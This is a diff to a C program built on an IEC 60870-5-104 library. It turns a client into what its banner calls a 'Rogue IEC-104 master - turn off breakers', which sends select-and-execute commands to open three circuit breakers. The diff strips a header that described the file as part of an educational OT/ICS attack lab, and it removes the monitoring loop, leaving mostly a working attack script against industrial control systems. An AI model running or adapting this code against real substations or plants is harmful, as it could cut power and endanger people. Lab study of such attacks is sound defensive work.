@@ -1,19 +1,3 @@
-/*
- * Author: 4p0cryph0n
- *
- * This file is part of an educational OT/ICS laboratory for studying
- * IEC 60870-5-104 attack vectors
- *
- * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation, either version 3 of the License, or
- * (at your option) any later version.
- *
- * This software is provided for educational and defensive security
- * research purposes only.
- */
-
-
 #include "cs104_connection.h"
 #include "hal_thread.h"
 #include "hal_time.h"
@@ -174,7 +158,7 @@ int main(void)
     int port = 2404;
     int commonAddress = 65535;   /* match your server */
 
-    printf("[*] IEC-104 client\n");
+    printf("[*]Rogue IEC-104 master - turn off breakers\n");
     printf("[*] Breakers: 1001, 1002, 1003\n");
 
     CS104_Connection con = CS104_Connection_create(ip, port);
@@ -193,14 +177,9 @@ int main(void)
     /* -------- SELECT and EXECUTE phase -------- */
     for (int i = 0; i < BREAKER_COUNT; i++) {
         sendSelect(con, commonAddress, breaker_ioas[i], false);
-	Thread_sleep(200); 
+        Thread_sleep(300); 
         sendExecute(con, commonAddress, breaker_ioas[i], false);
-        Thread_sleep(300);
-    }
-
-    /* -------- monitoring loop -------- */
-    while (running) {
-        Thread_sleep(1000);
+        Thread_sleep(5000);
     }
 
     CS104_Connection_destroy(con);
